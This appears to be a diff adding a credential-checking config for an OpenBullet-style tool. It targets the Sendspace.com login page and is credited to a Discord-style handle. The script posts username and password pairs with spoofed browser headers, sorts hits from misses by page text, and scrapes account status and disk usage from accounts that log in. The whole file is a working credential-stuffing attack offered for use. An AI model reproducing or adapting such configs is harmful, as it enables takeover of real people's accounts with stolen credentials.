@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Sendspace.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-07T14:17:36.9614944+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.sendspace.com/login.html" 
+  CONTENT "action=login&username=<USER>&password=<PASS>&remember=on&submit=Log+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.sendspace.com" 
+  HEADER "Origin: https://www.sendspace.com" 
+  HEADER "Referer: https://www.sendspace.com/login.html" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sign in failed" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+
+PARSE "<SOURCE>" LR "h1>Your account status:</h1>" "</b> " -> VAR "Account Status1" 
+
+#FIX_CAP FUNCTION Replace "<b>" " " "<Account Status1>" -> CAP "Account Status" 
+
+PARSE "<SOURCE>" LR "Total Disk Space Used: " "</li>" -> CAP "Disk Space Used" 
+
